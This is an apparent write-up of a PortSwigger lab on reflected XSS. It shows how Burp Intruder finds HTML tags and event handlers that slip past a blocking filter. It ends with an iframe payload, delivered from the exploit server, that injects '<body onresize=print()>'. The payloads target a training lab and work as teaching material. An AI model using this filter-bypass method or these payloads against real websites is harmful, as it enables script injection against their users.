## Question:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/309c69e7-6a48-493e-a51b-c821cffae17a)

## Solution:

Search for a standard xss vector```<img src=1 onerror=print()>```

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/60762158-f6c7-4db3-8033-86fc8fd15b32)

We can see that it is blocked

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/1b410006-50ab-4a1c-8446-21be7d891e7f)

and check the http request and send it to the intruder

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/a2cbf7ff-f4d3-446d-9059-4ef5314f81db)

At the intruder clear ```%3Cimg+src%3D1+onerror%3Dprint%28%29%3E``` and add payload ```<$$>```

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/01c0c524-1bbb-4abc-b36d-7c0fad2dede1)

From Cross-site scripting cheat sheet copy tags to clipboard

**![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/73a31469-5b94-4b5f-bb81-10187c87b961)

and paste it in the payload options

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/4fe3d827-8193-4a8f-a813-b3147373cc2a)

Start the attack and note the body 200 ok

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/d9c76f98-675c-43cc-abd4-5764f71a5cb2)

Go back to positions and add ```body%20§§=1```

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/16c3ca2a-e5bf-4a6d-8e57-a79bebd2f31b)

Go to cheat sheet and copy events to clipboard and add this to intruder

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/e90e02ff-1125-48a5-9d16-ea8b2eeda36f)

start the attack and check for 200 ok request

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/2264a3e8-1fad-4579-b230-6dcf6053a692)

go to the lab page and click for exploit server and type ```<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>``` in the body

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/7f730867-1f17-45d6-871c-121cae6483f5)

Store it and click ```deliver exploit to victim```

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/8d59c164-1aff-4d11-af0a-dea6ec8fd9d9)



